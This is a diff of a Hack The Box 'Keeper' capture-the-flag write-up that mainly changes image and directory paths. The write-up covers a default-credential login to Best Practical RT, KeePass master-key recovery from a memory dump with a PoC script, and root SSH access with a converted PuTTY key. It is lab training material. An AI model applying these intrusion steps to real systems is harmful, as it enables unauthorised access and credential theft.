@@ -40,27 +40,27 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We opened the webpage running on port 80 on our browser.
 
-![Untitled](Keeper/Untitled.png)
+![Untitled](images/Untitled.png)
 
 As we can see, we got a new subdomain on the box. We write it in our local `/etc/hosts` file.
 
-![Untitled](Keeper/Untitled%201.png)
+![Untitled](images/Untitled%201.png)
 
 Now accessing the subdomain link we are redirected to a login page for **Best Practical RT** on **version 4.4.4**.
 
-![Untitled](Keeper/Untitled%202.png)
+![Untitled](images/Untitled%202.png)
 
 First, we search for default credentials for the application on the Internet.
 
-![Untitled](Keeper/Untitled%203.png)
+![Untitled](images/Untitled%203.png)
 
 Using the default credentials we were able to log into the application.
 
-![Untitled](Keeper/Untitled%204.png)
+![Untitled](images/Untitled%204.png)
 
 Searching on the application, we got a password for the user **lnorgaard**.
 
-![Untitled](Keeper/Untitled%205.png)
+![Untitled](images/Untitled%205.png)
 
 # Exploitation
 
@@ -101,17 +101,17 @@ drwx------ 2 lnorgaard lnorgaard     4096 Jul 24 10:25 .ssh
 
 After successfully logging in, we found the `RT30000.zip` file on the home directory of the user. We downloaded this file to our local machine in order to analyze it.
 
-![Untitled](Keeper/Untitled%206.png)
+![Untitled](images/Untitled%206.png)
 
 Unzipping the file, we got.
 
 ```bash
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]
 └──╼ [★]$ unzip RT30000.zip 
 Archive:  RT30000.zip
   inflating: KeePassDumpFull.dmp     
  extracting: passcodes.kdbx          
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]
 └──╼ [★]$ ls -la
 total 332808
 drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n        88 ago 14 15:28 .
@@ -123,11 +123,11 @@ drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n        94 ago 14 15:28 ..
 
 We noticed that these files are from the **KeePass** application. We can interact with **KeePass** through the command line on the Linux terminal using the `kpcli` tool.
 
-![Untitled](Keeper/Untitled%207.png)
+![Untitled](images/Untitled%207.png)
 
 We don’t have the master password to open the `kdbx` file. We can generate the hash from this file using the script `keepass2john`.
 
-![Untitled](Keeper/Untitled%208.png)
+![Untitled](images/Untitled%208.png)
 
 Executing `john` with the extracted hash we couldn’t crack the master key. Then, searching around on the Internet, we found a tool that extracted the master key from the memory dump file that we have on the ZIP file downloaded previously.
 
@@ -140,7 +140,7 @@ This first tool is a PoC for Windows. On the bottom of the page, there is a PoC 
 Running the dumper in Python we got.
 
 ```bash
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]
 └──╼ [★]$ python3 keepass_masterkey_dumper.py -h
 usage: keepass_masterkey_dumper.py [-h] [-d] dump
 
@@ -152,7 +152,7 @@ positional arguments:
 optional arguments:
   -h, --help   show this help message and exit
   -d, --debug  Enable debugging mode
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]
 └──╼ [★]$ python3 keepass_masterkey_dumper.py -d KeePassDumpFull.dmp
 2023-08-14 16:12:23,245 [.] [main] Opened KeePassDumpFull.dmp
 Possible password: ●,dgr●d med fl●de
@@ -172,20 +172,20 @@ Possible password: ●Mdgr●d med fl●de
 
 With the help of Google Translator, we identify the language of the possible master key.
 
-![Untitled](Keeper/Untitled%209.png)
+![Untitled](images/Untitled%209.png)
 
 We paste this output in ChatGPT and tell him that the word is Danish in order to get help for these words.
 
-![Untitled](Keeper/Untitled%2010.png)
+![Untitled](images/Untitled%2010.png)
 
 Now, the ChatGPT tells us that the word could be “Apple porridge with cream” which let us think the master key could be some Danish dish name. Telling to ChatGPT to list for us possible dishes that contain these words, we got.
 
-![Untitled](Keeper/Untitled%2011.png)
+![Untitled](images/Untitled%2011.png)
 
 As we can see, there is a unique possible dish that matches our master key `(Rødgrød med Fløde)`. On our first try we weren’t able to open the KeePass Database. So we try with all letters in lower case `(rødgrød med fløde)`. Now we finally found our master key.
 
 ```bash
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]                                                                                                             
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]                                                                                                             
 └──╼ [★]$ kpcli --kdb passcodes.kdbx                                                                                                                                                          
 Please provide the master password: *************************                                                                                                                                 
                                                                                                                                                                                               
@@ -323,10 +323,10 @@ Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
 Now, using the PuTTYGen tool running in a Docker image we convert the format to the OpenSSH valid format.
 
 ```bash
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]
 └──╼ [★]$ docker run --rm -ti -v $PWD:/keys luiszbm/putty-tools puttygen key.ppk -O private-openssh -o id_rsa_root
 
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]
 └──╼ [★]$ ls -la
 total 332832
 drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n       306 ago 14 16:48 .
@@ -346,7 +346,7 @@ drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n        94 ago 14 15:28 ..
 Now given the right permissions and log into the SSH using the private key, we were able to log in as user root.
 
 ```bash
-─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/keeper/RT30000]
+─[us-free-2]─[10.10.14.108]─[th3g3ntl3m4n@parrot]─[~/htb/machines/images/RT30000]
 └──╼ [★]$ sudo ssh -i id_rsa_root root@keeper.htb
 The authenticity of host 'keeper.htb (10.129.98.144)' can't be established.
 ECDSA key fingerprint is SHA256:apkh696g2/uAeckIXd6eFvgmvmPqoEj41w4ia45OfrI.
@@ -381,4 +381,4 @@ drwxr-xr-x  2 root root     4096 Jul 25 20:11 SQL
 -rw-r-----  1 root root       33 Aug 14 05:45 root.txt
 ```
 
-![Untitled](Keeper/Untitled%2012.png)
+![Untitled](images/Untitled%2012.png)
